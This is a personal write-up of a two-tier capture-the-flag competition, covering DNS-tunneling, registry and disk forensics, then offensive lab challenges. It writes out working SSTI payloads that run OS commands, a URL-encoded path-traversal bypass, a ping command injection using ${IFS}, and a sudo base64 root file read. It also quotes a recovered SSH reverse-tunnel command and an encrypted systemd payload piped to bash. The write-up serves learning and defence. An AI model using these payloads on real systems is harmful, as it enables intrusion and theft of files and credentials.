---
layout: page
hide_description: true
title: Target + WiCyS Cyber Defense Challenge 2025
description:  Writeup for the annual Target Cyber Defense Challenge!
---

# Target + WiCyS Cyber Defense Challenge 2025
## Top 50 of 896 Participants | Solo Competitor | Tier 1 & Tier 2

---

**Competition:** Target + WiCyS Cyber Defense Challenge  
**Date:** July – August 2025  
**Format:** Solo, two-tier CTF  
**Result:** Top 50 of 896 participants (top 6%), advancing to Tier 2

---

### Overview

The Target + WiCyS Cyber Defense Challenge is an annual cybersecurity competition hosted by Target in partnership with Women in CyberSecurity (WiCyS). Tier 1 presented a defensive scenario centered on a fictional company, Personalyz.io, that had suffered a breach. Competitors were given access to log dashboards, forensic artifacts, and internal systems to reconstruct attacker activity and answer challenge questions. The top 50 Tier 1 finishers advanced to Tier 2, which flipped the scenario: competitors took the role of the attacker, testing offensive skills against the same environment.

I competed solo and finished in the top 6% of 896 participants, advancing to Tier 2.

The challenges I've documented here span DFIR, network forensics, disk forensics, endpoint analysis, and offensive techniques including SSTI, LFI, RCE, and privilege escalation.

---

## Tier 1: Defense

---

### D6 — Smuggled Away (500 pts)
**Category:** Network Forensics / Data Exfiltration  
**Skills:** DNS tunneling analysis, Base32 decoding, gzip decompression, CyberChef

#### Background
Building on D5, where I identified DNS tunneling between an internal host (`10.75.34.13`) and a C2 server (`251.91.13.37`), this challenge asked me to recover the actual data that had been exfiltrated.

#### Analysis
The PCAP contained 33 DNS queries from the compromised host, each with a randomly-looking subdomain. I extracted the first label from each query and concatenated them:

```
d6fqqaecfjjgqax7bxglcducgaiabuhz73remhou332tqyetdajb2zeqzgyway2mfzenv6x76ia665iwm4mk77pd3ygsbjbv6yqrp5hjqxr7us3qrffutqpqs3w3hqxqasrjuglwjtkr4g27dxmloddblphhtgw762oyehmxldaaxk4iunlbwjjbochhjqzh577bt4hmlrzqaaaa
```

The character set — lowercase a–z and digits 2–7 — matched Base32 encoding (which uses uppercase A–Z and 2–7). Converting to uppercase and running through CyberChef with "From Base32 → Gunzip" decoded the payload:

```
Alec SHERMAN 4167 East 3rd Spur Central Islip NY 11722
(215) 835-2392 alec@sbcglobal.net 342644019686141 0016 11/30
```

#### Takeaway
The attacker had compressed victim PII with gzip, Base32-encoded it, and split it across DNS subdomain labels to exfiltrate it covertly — a classic DNS tunneling technique designed to blend into normal DNS traffic. The key signal in Wireshark was the pattern of randomized subdomains from a single internal host communicating exclusively with one external IP over UDP/53.

---

### D11 — Semi-Final Boss (300 pts)
**Category:** Endpoint Forensics / Registry Analysis  
**Skills:** Windows Registry analysis, USB/HID device enumeration, Registry Explorer, RegRipper

#### Background
A new employee's Windows machine showed almost no suspicious indicators — no malware, no C2 traffic, clean browser history. My task was to analyze an extracted SYSTEM registry hive and identify at least one suspicious registry key pointing to covert activity.

#### Analysis
I started with `hivexsh` on Kali but found the CLI navigation slow. I switched to Registry Explorer on Windows for a GUI-based hierarchical view, which made pattern recognition much faster.

Challenge hints pointed toward devices that behave like human input peripherals but could be used for covert control. I focused on:

- `HKLM\SYSTEM\ControlSet001\Enum\HID`
- `HKLM\SYSTEM\ControlSet001\Enum\USB`
- `HKLM\SYSTEM\ControlSet001\Enum\USBSTOR`

Within the HID branch, I found a device with the identifier `VID_1D6B&PID_0104` — a Linux Multifunction Composite Gadget. This is unusual on a Windows host. The machine already had standard Dell keyboard and mouse devices registered, making this third HID device an anomaly.

**Suspicious key:**
```
ControlSet001\Enum\HID\VID_1D6B&PID_0104&MI_00\7&181c197a&0&0000
```

#### Takeaway
`VID_1D6B&PID_0104` is a Linux USB gadget that can emulate multiple device types simultaneously. On a Windows endpoint with legitimate Dell peripherals already registered, an additional Linux-based composite HID device is a strong indicator of a hardware implant.

---

### D12 — Final Boss (500 pts)
**Category:** Disk Forensics / Cryptanalysis / Persistence Analysis  
**Skills:** fdisk, LUKS encryption, John the Ripper, systemd persistence, OpenSSL, bash internals

#### Background
I was given a Raspberry Pi SD card image (`sdcard.img`) and tasked with identifying a persistence mechanism and extracting a hidden IOC.

#### Analysis

**Step 1: Partition analysis**
```bash
fdisk -l sdcard.img
```
The image had two partitions: a FAT32 boot partition and a 4.2GB Linux ext4 partition that turned out to be LUKS-encrypted.

**Step 2: Mounting and cracking**
```bash
sudo losetup -f --show -o $((532480 * 512)) sdcard.img
# Returns /dev/loop3
sudo cryptsetup luksDump /dev/loop3
sudo luks2john /dev/loop3 > luks_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt luks_hash.txt
```
John cracked the LUKS passphrase: **`djcat`**

**Step 3: Finding the persistence mechanism**
After mounting the decrypted volume, standard investigation paths (home directories, /var/log, /root) didn't reveal anything immediately. Knowing that systemd services are a common Linux persistence method, I checked:

```
/etc/systemd/system/tunnel.service
```

The service contained an obfuscated payload:

```ini
[Service]
Environment=SERVICEDATA="U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+..."
ExecStart=/bin/bash -c 'openssl enc -aes-256-cbc -d -a -pass pass:$HOSTNAME$MACHTYPE \
  -pbkdf2 <<< "$SERVICEDATA" | bash'
```

The decryption password was `$HOSTNAME$MACHTYPE` — environment variables populated at runtime.

**Step 4: Recovering the decryption key**
`$HOSTNAME` came from `/etc/hostname`: **`tinypilot`**

`$MACHTYPE` is not `uname -m` output — it's a static value compiled into bash itself:
```bash
strings /usr/bin/bash | grep linux
# arm-unknown-linux-gnueabihf
```

**Step 5: Decrypting the payload**
```bash
echo "$SERVICEDATA" | openssl enc -aes-256-cbc -d -a \
  -pass pass:tinypilotarm-unknown-linux-gnueabihf -pbkdf2
```

Revealed:
```bash
/usr/bin/ssh -NT -R 2222:localhost:22 user@232.122.57.92
```

#### Takeaway
The attacker had established a persistent SSH reverse tunnel, disguised inside a systemd service that would restart every 60 seconds. The payload was encrypted using a machine-specific key derived from hostname and bash's compiled-in `$MACHTYPE` — making static analysis harder.

---

## Tier 2: Offense

---

### O2.1 — Touchy Templates (300 pts)
**Category:** Web Application Security  
**Skills:** Server-Side Template Injection (SSTI), Jinja2 sandbox escape, RCE

#### Analysis
The target was a web application with a form accepting name and email inputs. I tested for SSTI by submitting `{{7*7}}` — it returned `49`, confirming Jinja2 template injection.

I escalated using Jinja2's object traversal to reach OS-level execution:

```python
{{ cycler.__init__.__globals__.os.popen("ls -la /app").read() }}
{{ cycler.__init__.__globals__.os.popen("grep -R 'FLAG{' /app 2>/dev/null").read() }}
# Returns: /app/app.py:ADMIN_PASS = "FLAG{NoConsoleForYou!}"
```

#### Takeaway
SSTI occurs when user input is rendered directly by a template engine without sanitization. In Jinja2, the `cycler` global provides a reliable path to `os` without requiring sandbox escape gadgets. Mitigations include sandboxing template execution and never rendering unsanitized user input.

---

### O2.2 — Friendly Files (300 pts)
**Category:** Web Application Security  
**Skills:** Local File Inclusion (LFI), WAF bypass, SSH key enumeration

#### Analysis
The application loaded pages via a `?page=` GET parameter. Direct path traversal (`../../../../etc/passwd`) was blocked by a WAF detecting `../`. I bypassed it using URL encoding:

```
?page=.%2e/.%2e/.%2e/.%2e/etc/passwd
```

This worked. I enumerated the git index to find unexpected files, discovered an SSH key directory, and iterated through common key names across user home directories with a Python script, finding a private key at `/home/zero/.ssh/id_ed25519`.

#### Takeaway
WAF rules that block literal `../` strings are bypassable with URL encoding (`%2e%2e`). LFI to SSH key disclosure is a direct path to remote code execution. Mitigations: input allowlisting and not storing private keys in web-accessible paths.

---

### O2.3 — Naughty Network (300 pts)
**Category:** Web Application Security / Command Injection  
**Skills:** Ping-based RCE, WAF bypass, Burp Suite

#### Analysis
A network diagnostics panel accepted a hostname for ping — client-side validation blocked special characters. I intercepted the request in Burp Suite and modified it directly:

```
GET /diag?ping=127.0.0.1;ls HTTP/1.1
```

This worked. Spaces were blocked, so I used `${IFS}` (bash's Internal Field Separator) as a substitute:

```
GET /diag?ping=127.0.0.1;ls${IFS}-al HTTP/1.1
```

The flag was in `entrypoint.sh`.

#### Takeaway
Client-side input validation is never a security control — it's bypassed trivially with a proxy. Server-side command injection via ping utilities is a classic vulnerability. `${IFS}` is a reliable space substitute in bash when space characters are filtered.

---

### O3 — Escalation of Power (300 pts)
**Category:** Privilege Escalation  
**Skills:** Restricted shell (rbash) analysis, sudo misconfiguration, GTFOBins, base64 abuse

#### Analysis
I SSH'd into a restricted bash environment (rbash). Available binaries were limited: `base64`, `clear`, `ls`, `openssl`, `rm`, `sudo`. No slash characters in commands, no output redirection.

`sudo -l` revealed a critical misconfiguration:
```
(r00t) NOPASSWD: /tools/base64
```

I could run `base64` as `r00t` without a password. I used this to read arbitrary files as root:

```bash
sudo -u r00t base64 /home/r00t/.bash_history | base64 -d
```

The history (1,000 lines) revealed the flag filename: `f14g.txt`. The file was RSA-encrypted; the history also revealed the key generation command, letting me recover the key name. The decryption password turned out to be the SSH login password provided in the challenge.

```
flag{sudo_m4de_m3_r00t}
```

#### Takeaway
`sudo` misconfigurations are one of the most common privilege escalation paths on Linux systems. Any binary that can read files — including `base64`, `cat`, `tee`, `less` — becomes a root file read primitive if it can be run as root without a password. Always audit `sudo -l` during post-exploitation enumeration. Reference: [GTFOBins: base64](https://gtfobins.github.io/gtfobins/base64/)

---

## Reflections

This competition covered more ground in two months than most structured courses do in a semester. The challenges I found most meaningful were the ones that required thinking across layers — like D12, where cracking the disk image was only the beginning, and the real work was understanding how `$MACHTYPE` is populated in bash to recover a runtime decryption key. That kind of detail-oriented, cross-disciplinary thinking is what I find most engaging about security work.

The Tier 2 offensive challenges reinforced something I already suspected: understanding how attacks work makes you a better defender. Knowing how `${IFS}` bypasses a space filter, or how Jinja2 template objects expose `os`, makes those detections and mitigations concrete rather than abstract.

**Tools used:** Wireshark, CyberChef, John the Ripper, Burp Suite, Registry Explorer, cryptsetup, fdisk, hivexsh, ldapsearch, smbclient, Python, bash

---

